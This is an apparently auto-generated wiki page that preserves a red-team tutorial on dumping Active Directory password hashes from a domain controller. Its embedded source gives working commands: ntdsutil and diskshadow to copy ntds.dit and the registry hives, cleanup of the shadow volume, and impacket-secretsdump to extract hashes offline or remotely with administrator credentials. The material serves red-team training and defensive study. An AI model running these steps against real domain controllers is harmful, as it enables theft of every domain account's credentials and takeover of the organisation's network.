---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Dumping Domain Controller Hashes Locally and Remotely

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-ntds.dit-enumeration` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Dumping Domain Controller Hashes Locally and Remotely](../../topics/offensive-security/dumping-domain-controller-hashes-locally-and-remotely.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-credential-access-and-credential-dumping-ntds.dit-enumeration |
| name | Dumping Domain Controller Hashes Locally and Remotely |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration.md |

## Preserved Source Material

````yaml
_asset_filenames:
- image (223).png
- image (406).png
- ntds-hashdump (1).png
- ntdsutil-attacker.png
_body: "---\ndescription: Dumping NTDS.dit with Active Directory users hashes\n---\n\n# Dumping Domain Controller Hashes Locally\
  \ and Remotely\n\n## No Credentials - ntdsutil\n\nIf you have no credentials, but you have access to the DC, it's possible\
  \ to dump the ntds.dit using a lolbin ntdsutil.exe:\n\n{% tabs %}\n{% tab title=\"attacker@victim\" %}\n```bash\npowershell\
  \ \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\temp' q q\"\n```\n{% endtab %}\n{% endtabs %}\n\nWe can see that the\
  \ ntds.dit and SYSTEM as well as SECURITY registry hives are being dumped to c:\\temp:\n\n![](../../.gitbook/assets/ntdsutil-attacker.png)\n\
  \nWe can then dump password hashes offline with impacket:\n\n{% tabs %}\n{% tab title=\"attacker@local\" %}\n```bash\nroot@~/tools/mitre/ntds#\
  \ /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local\n```\n{% endtab %}\n{% endtabs %}\n\
  \n![](<../../.gitbook/assets/ntds-hashdump (1).png>)\n\n## No Credentials - diskshadow\n\nOn Windows Server 2008+, we can\
  \ use diskshadow to grab the ntdis.dit.\n\nCreate a shadowdisk.exe script instructing to create a new shadow disk copy of\
  \ the disk C (where ntds.dit is located in our case) and expose it as drive Z:\\\\\n\n{% code title=\"shadow.txt\" %}\n\
  ```erlang\nset context persistent nowriters\nset metadata c:\\exfil\\metadata.cab\nadd volume c: alias trophy\ncreate\n\
  expose %someAlias% z:\n```\n{% endcode %}\n\n...and now execute the following:\n\n```erlang\nmkdir c:\\exfil\ndiskshadow.exe\
  \ /s C:\\users\\Administrator\\Desktop\\shadow.txt\ncmd.exe /c copy z:\\windows\\ntds\\ntds.dit c:\\exfil\\ntds.dit\n```\n\
  \nBelow shows the ntds.dit got etracted and placed into our c:\\exfil folder:\n\n![](<../../.gitbook/assets/image (406).png>)\n\
  \nInside interactive diskshadow utility, clean up the shadow volume:\n\n```\ndiskshadow.exe\n    > delete shadows volume\
  \ trophy\n    > reset\n```\n\n## With Credentials\n\nIf you have credentials for an account that can log on to the DC, it's\
  \ possible to dump hashes from NTDS.dit remotely via RPC protocol with impacket:\n\n```\nimpacket-secretsdump -just-dc-ntlm\
  \ offense/administrator@10.0.0.6\n```\n\n![](<../../.gitbook/assets/image (223).png>)\n\n## References\n\n{% embed url=\"\
  https://adsecurity.org/?p=2362\" %}\n\n{% embed url=\"https://www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-(VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM)/\"\
  \ %}\n\n{% embed url=\"https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\"\
  \ %}"
_relative_path: offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration.md
````
